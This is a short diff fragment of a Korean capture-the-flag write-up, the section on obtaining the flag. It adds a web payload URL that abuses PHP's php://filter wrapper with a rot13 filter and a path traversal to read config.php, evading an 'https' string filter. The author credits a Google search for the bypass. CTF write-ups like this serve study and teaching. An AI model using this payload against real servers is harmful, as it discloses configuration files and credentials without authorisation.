@@ -49,3 +49,10 @@ PHP Wrapper 는 간략히 말하여 본 데이터를 원활히 출력 혹은 실
 
 ## 플래그 획득
 
+**\<payload\>**
+> http://13.125.66.218/index.php?url=https@php://filter/write=string.rot13/resource=../../../../../config.php
+
+우선 플래그 획득에 쓰인 페이로드는 위와 같다.
+
+초입에 말한 https 필터링을 어찌 우회할지 고민하였는데 구글링 결과 이런 것이 있었다.
+
